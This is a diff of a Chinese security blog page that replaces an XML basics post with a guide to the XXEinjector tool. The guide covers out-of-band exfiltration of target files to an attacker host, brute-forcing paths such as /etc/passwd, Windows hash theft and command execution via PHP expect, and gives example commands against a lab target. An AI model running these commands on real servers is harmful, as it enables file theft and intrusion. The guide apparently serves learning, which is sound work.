@@ -15,20 +15,18 @@
 
 
 
-<meta name="description" content="0x00 XML概述 XML 指可扩展标记语言（eXtensible Markup Language）。 XML 的设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义。 XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。   XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。">
-<meta name="keywords" content="XML,Language">
+<meta name="description" content="一、XXE Payload Cheatsheethttps://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection 二、XXEinjector工具0x00 XXEinjecto">
+<meta name="keywords" content="XXE,Tools,Payload,Cheatsheel">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XML基本知识学习">
-<meta property="og:url" content="https://sakuxa.com/2019/02/28/xml/index.html">
+<meta property="og:title" content="XXE漏洞利用工具及其资源">
+<meta property="og:url" content="https://sakuxa.com/2019/03/04/xxe-tool/index.html">
 <meta property="og:site_name" content="IT技术学习分享自留地">
-<meta property="og:description" content="0x00 XML概述 XML 指可扩展标记语言（eXtensible Markup Language）。 XML 的设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义。 XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。   XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。">
+<meta property="og:description" content="一、XXE Payload Cheatsheethttps://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection 二、XXEinjector工具0x00 XXEinjecto">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://sakuxa.com/2019/02/28/xml/QQ截图20190228152213.png">
-<meta property="og:updated_time" content="2019-03-01T06:54:45.175Z">
+<meta property="og:updated_time" content="2019-03-04T08:21:59.214Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XML基本知识学习">
-<meta name="twitter:description" content="0x00 XML概述 XML 指可扩展标记语言（eXtensible Markup Language）。 XML 的设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义。 XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。   XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。">
-<meta name="twitter:image" content="https://sakuxa.com/2019/02/28/xml/QQ截图20190228152213.png">
+<meta name="twitter:title" content="XXE漏洞利用工具及其资源">
+<meta name="twitter:description" content="一、XXE Payload Cheatsheethttps://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection 二、XXEinjector工具0x00 XXEinjecto">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -60,7 +58,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>XML基本知识学习 | IT技术学习分享自留地</title>
+<title>XXE漏洞利用工具及其资源 | IT技术学习分享自留地</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -264,11 +262,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-xml" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-xxe-tool" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/02/28/xml/" class="article-date">
-      <time datetime="2019-02-28T07:10:47.000Z" itemprop="datePublished">2019-02-28</time>
+      <a href="/2019/03/04/xxe-tool/" class="article-date">
+      <time datetime="2019-03-04T08:02:01.000Z" itemprop="datePublished">2019-03-04</time>
 </a>
 
 
@@ -283,7 +281,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      XML基本知识学习
+      XXE漏洞利用工具及其资源
     </h1>
   
 
@@ -292,13 +290,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/语言/">语言</a>
+    <a class="article-category-link" href="/categories/WEB漏洞学习/">WEB漏洞学习</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Language/">Language</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XML/">XML</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Cheatsheel/">Cheatsheel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Payload/">Payload</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tools/">Tools</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -308,72 +306,63 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-XML概述"><a href="#0x00-XML概述" class="headerlink" title="0x00 XML概述"></a>0x00 XML概述</h2><ul>
-<li>XML 指可扩展标记语言（eXtensible Markup Language）。</li>
-<li>XML 的设计宗旨是传输数据，而不是显示数据。</li>
-<li>XML 标签没有被预定义。</li>
-<li>XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。</li>
-</ul>
-<blockquote>
-<p>XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。</p>
-</blockquote>
+        <h2 id="一、XXE-Payload-Cheatsheet"><a href="#一、XXE-Payload-Cheatsheet" class="headerlink" title="一、XXE Payload Cheatsheet"></a>一、XXE Payload Cheatsheet</h2><p><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a></p>
+<h2 id="二、XXEinjector工具"><a href="#二、XXEinjector工具" class="headerlink" title="二、XXEinjector工具"></a>二、XXEinjector工具</h2><h3 id="0x00-XXEinjector概述"><a href="#0x00-XXEinjector概述" class="headerlink" title="0x00 XXEinjector概述"></a>0x00 XXEinjector概述</h3><p>XXEinjector 是一款XXE Fuzz漏洞利用工具。</p>
+<p>XXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。</p>
+<p>XXEinjector 可以使用直接检索和带外的方式。</p>
 <a id="more"></a>
-<p><strong>XML与HTML</strong></p>
-<p>1.XML 和 HTML 为不同的目的而设计：</p>
+<p>XXEinjector 的目录遍历（<code>--path</code>）只能用于Java应用程序。其他类型的应用程序只能使用爆破（<code>--brute</code>）的方法。</p>
+<p>带外方式要求目标主机可以访问我们指定的主机（<code>--host</code>），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）</p>
+<p>工具地址：<a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="noopener">https://github.com/enjoiz/XXEinjector</a></p>
+<h3 id="0x01-基本重要参数使用方法"><a href="#0x01-基本重要参数使用方法" class="headerlink" title="0x01 基本重要参数使用方法"></a>0x01 基本重要参数使用方法</h3><p><code>--file</code>：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用”XXEINJECT”来标记注入点。</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.199.111</span><br><span class="line">&gt; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">&gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">&gt; Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">&gt; Accept-Encoding: gzip, deflate</span><br><span class="line">&gt; Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php</span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class="line">&gt; Content-Length: 30</span><br><span class="line">&gt; Connection: close</span><br><span class="line">&gt; Upgrade-Insecure-Requests: 1</span><br><span class="line">&gt; </span><br><span class="line">&gt; xml=XXEINJECT&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><code>--path</code>：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则那种程序都可以用。爆破文件则使用<code>--brute</code>。</p>
+<blockquote>
+<p><code>--path=/etc</code></p>
+<p><code>--path=s://test.txt</code></p>
+</blockquote>
+<p><code>--brute</code>：该选项用于爆破文件，用于指定包含<code>文件路径</code>的字典文件。结果在<code>brute.log</code>文件中。</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; s://test.txt</span><br><span class="line">&gt; s://test1.txt</span><br><span class="line">&gt; /etc/passwd</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><strong>工具包含直接和带外两种检索文件的方式。</strong></p>
+<p><strong>默认是带外方式：</strong></p>
+<p><code>--oob=ftp/http/gopher</code>：带外方式提供ftp(默认)、http、gopher三种协议。</p>
 <blockquote>
 <ul>
-<li>XML 被设计用来传输和存储数据。</li>
-<li>HTML 被设计用来显示数据。</li>
+<li>ftp协议适用于任意类型WEB程序。</li>
+<li>http、gopher协议只适用于Java &lt; 1.7的Java WEB应用程序。</li>
 </ul>
 </blockquote>
-<p>2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。</p>
-<p><strong>3.XML 是独立于软件和硬件的信息传输工具。</strong></p>
-<h2 id="0x01-XML结构"><a href="#0x01-XML结构" class="headerlink" title="0x01 XML结构"></a>0x01 XML结构</h2><blockquote>
-<p>XML文档是树形结构的，由根元素扩展，且必须包含根元素。</p>
+<p><code>--host</code>：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。</p>
+<p><code>--httpport</code>：<code>--host</code>指定的主机监听的WEB服务端口。默认80</p>
+<p><code>--ftpport</code>：<code>--host</code>指定的主机监听的FTP服务端口。默认21</p>
+<p><code>--direct</code></p>
+<p><strong>直接方式</strong></p>
+<p><code>--direct</code>：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。</p>
+<p><strong>其他参数：</strong></p>
+<p><code>--verbose</code>：显示详细信息，可以显示攻击数据包等。推荐使用。</p>
+<p><code>--phpfilter</code>：使用PHP filter对检索文件进行Base64编码。</p>
+<p><code>--ssl</code>：用于https站点。</p>
+<p><code>--expect</code>：使用 PHP expect 扩展执行系统命令。</p>
+<p><code>--output</code>：<code>--brute</code>输出结果保留路径文件。</p>
+<h3 id="0x03-使用实例"><a href="#0x03-使用实例" class="headerlink" title="0x03 使用实例"></a>0x03 使用实例</h3><ul>
+<li><p><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter</code></p>
+<blockquote>
+<p>结果在Logs\IP\目录下。</p>
 </blockquote>
-<p><strong>一个栗子:</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;note date=&quot;9102/2/28&quot;&gt;</span><br><span class="line">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>第一行是XML声明，指定XML版本以及编码方式，声明是可选的。</li>
-<li><code>&lt;note&gt;</code>为根元素，XML标签都是成对且闭合的，以<code>&lt;/note&gt;</code>闭合标签。</li>
-<li>XML是大小写敏感的，<code>&lt;note&gt;</code>与<code>&lt;Note&gt;</code>是不同的标签。</li>
-<li>标签是可以设置属性的，如例子中<code>&lt;note&gt;</code>标签的<code>date</code>，但是属性的值必须使用引号括起来。</li>
+</li>
+<li><p><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl</code></p>
+<blockquote>
+<p>结果在brute.log文件中。</p>
+</blockquote>
+</li>
 </ul>
-<p><strong>实体引用：</strong></p>
-<p>在 XML 中，一些字符拥有特殊的意义。</p>
-<p>例如，如果把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 使用下面会发生错误 --&gt;</span><br><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>
-<p>为了避免这个错误，用<strong>实体引用</strong>来代替 “&lt;” 字符：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>
-<p>XML有5个预定义的实体引用：</p>
-<p><img src="/2019/02/28/xml/QQ截图20190228152213.png" alt></p>
-<h2 id="0x02-DTD"><a href="#0x02-DTD" class="headerlink" title="0x02 DTD"></a>0x02 DTD</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块。</p>
-<p><strong>1.为什么使用DTD？</strong></p>
-<p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p>
-<p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>
-<p>还可以用DTD 来验证从外部接收到的、自身的数据。</p>
-<p><strong>2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p>
-<p>i.在文档内声明的栗子：<code>&lt;!DOCTYPE root-element [element-declarations]&gt;</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [    #定义此文档是 note 类型的文档。</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;   #定义note元素有四个元素：&quot;to、from、heading、body&quot;</span><br><span class="line">  &lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body (#PCDATA)&gt;   #定义body元素为&quot;#PCDATA&quot;类型</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<p>ii.作为外部引用的例子：<code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;  #引用外部文件note.dtd</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<p><code>note.dtd</code>文件内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>3.DTD实体</strong></p>
-<p><strong>实体</strong>是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
-<p><strong>实体引用</strong>是对实体的引用。引用后会获得实体指向的实际数据。</p>
-<p><strong>实体声明也是在DTD声明中，与元素声明同级。</strong></p>
-<p>i.在文档内部声明实体的例子：<code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [    </span><br><span class="line">  &lt;!ELEMENT note ANY&gt;   #定义note元素可以有任意元素。</span><br><span class="line">  </span><br><span class="line">  &lt;!ENTITY entity1 &quot;Be&quot;&gt;      #文档内声明</span><br><span class="line">  &lt;!ENTITY entity2 &quot;back.&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;entity1; &amp;entity2;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<p>ii.外部声明引用实体的例子：<code>&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</code> or <code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [    </span><br><span class="line">  &lt;!ELEMENT note ANY&gt;   </span><br><span class="line">  </span><br><span class="line">  &lt;!ENTITY entity1 SYSTEM &quot;http://www.sakuxa.com/example.xml&quot;&gt;  #system关键字表示外部引用</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt; &amp;entity1;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<p>iii.参数实体</p>
-<p>参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。</p>
-<p><strong>记住：%entity; 会被它指向的数据进行直接替换。</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [    </span><br><span class="line">  &lt;!ELEMENT note ANY&gt;   </span><br><span class="line">  </span><br><span class="line">  &lt;!ENTITY % entity1 SYSTEM &quot;http://www.sakuxa.com/example.dtd&quot;&gt;</span><br><span class="line">  %entity1  #会被example.dtd内容替换</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt; &amp;entity2;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<p><code>example.dtd</code>文件内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity2 &quot;Be back.&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>注意：</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">--host	    必选项 - our IP address for reverse connections. (--host=192.168.0.2)</span><br><span class="line">--file	    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用&quot;XXEINJECT&quot;来标记的注入点。                      (--file=/tmp/req.txt)</span><br><span class="line"></span><br><span class="line">--path	    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)</span><br><span class="line">--brute	    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)</span><br><span class="line">--logger    Log results only. Do not send requests. HTTP logger looks for &quot;p&quot; parameter with             results.</span><br><span class="line">  </span><br><span class="line">--rhost	    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)</span><br><span class="line">--rport	    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)</span><br><span class="line"></span><br><span class="line">--oob	    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java &lt; 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java &lt; 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)</span><br><span class="line"></span><br><span class="line">--direct	直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)</span><br><span class="line"></span><br><span class="line">--cdata	    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.</span><br><span class="line"></span><br><span class="line">--2ndfile	File containing valid HTTP request used in second order exploitation. </span><br><span class="line">			(--2ndfile=/tmp/2ndreq.txt)</span><br><span class="line"></span><br><span class="line">--phpfilter	使用PHP filter对文件进行Base64编码.</span><br><span class="line">--netdoc    使用netdoc协议而不是file协议。 (Java).</span><br><span class="line">--enumports	Enumerating unfiltered ports for reverse connection. Specify value &quot;all&quot; to     			enumerate all TCP ports. (--enumports=21,22,80,443,445)</span><br><span class="line"></span><br><span class="line">--hashes	窃取Windows哈希值.</span><br><span class="line">--expect	使用 PHP expect 扩展执行系统命令. (--expect=ls)</span><br><span class="line">--upload	Uploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)</span><br><span class="line"></span><br><span class="line">--xslt	    Tests for XSLT injection.</span><br><span class="line"></span><br><span class="line">--ssl	    Use SSL.</span><br><span class="line">--proxy	    Proxy to use. (--proxy=127.0.0.1:8080)</span><br><span class="line">--httpport	   Set custom HTTP port. (--httpport=80)</span><br><span class="line">--ftpport	   Set custom FTP port. (--ftpport=21)</span><br><span class="line">--gopherport   Set custom gopher port. (--gopherport=70)</span><br><span class="line">--jarport	   Set custom port for uploading files using jar. (--jarport=1337)</span><br><span class="line">--xsltport	   Set custom port for XSLT injection test. (--xsltport=1337)</span><br><span class="line"></span><br><span class="line">--test	    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。</span><br><span class="line"></span><br><span class="line">--urlencode	URL encode injected DTD. This is default for URI.</span><br><span class="line">--nodtd	     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用&quot;--dtd&quot;可以看dtd              文件格式。</span><br><span class="line"></span><br><span class="line">--output	爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中</span><br><span class="line">			(--output=/tmp/out.txt)</span><br><span class="line"></span><br><span class="line">--timeout	    Timeout for receiving file/directory content. (--timeout=20)</span><br><span class="line">--contimeout	Timeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)</span><br><span class="line"></span><br><span class="line">--fast	    Skip asking what to enumerate. Prone to false-positives.</span><br><span class="line">--verbose	    Show verbose messages.</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-XXE学习资源"><a href="#0x03-XXE学习资源" class="headerlink" title="0x03 XXE学习资源"></a>0x03 XXE学习资源</h2><p><a href="https://nosec.org/home/detail/2139.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2139.html</a></p>
 
       
     </div>
@@ -382,13 +371,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/02/28/xml/">XML基本知识学习</a></p>
+        <p><span>本文标题:</span><a href="/2019/03/04/xxe-tool/">XXE漏洞利用工具及其资源</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">sh4douu</a></p>
-        <p><span>发布时间:</span>2019-02-28, 15:10:47</p>
-        <p><span>最后更新:</span>2019-03-01, 14:54:45</p>
+        <p><span>发布时间:</span>2019-03-04, 16:02:01</p>
+        <p><span>最后更新:</span>2019-03-04, 16:21:59</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/02/28/xml/" title="XML基本知识学习">https://sakuxa.com/2019/02/28/xml/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/02/28/xml/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/04/xxe-tool/" title="XXE漏洞利用工具及其资源">https://sakuxa.com/2019/03/04/xxe-tool/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/03/04/xxe-tool/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -400,16 +389,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/01/XXE/">
-                    XXE（XML External Entity）漏洞
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/02/28/文件与目录权限/">
-                    文件与目录权限
+                <a href="/2019/03/01/XXE/">
+                    XXE（XML External Entity）漏洞
                 </a>
             </div>
         
@@ -421,7 +404,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-XML概述"><span class="toc-number">1.</span> <span class="toc-text">0x00 XML概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-XML结构"><span class="toc-number">2.</span> <span class="toc-text">0x01 XML结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-DTD"><span class="toc-number">3.</span> <span class="toc-text">0x02 DTD</span></a></li></ol>
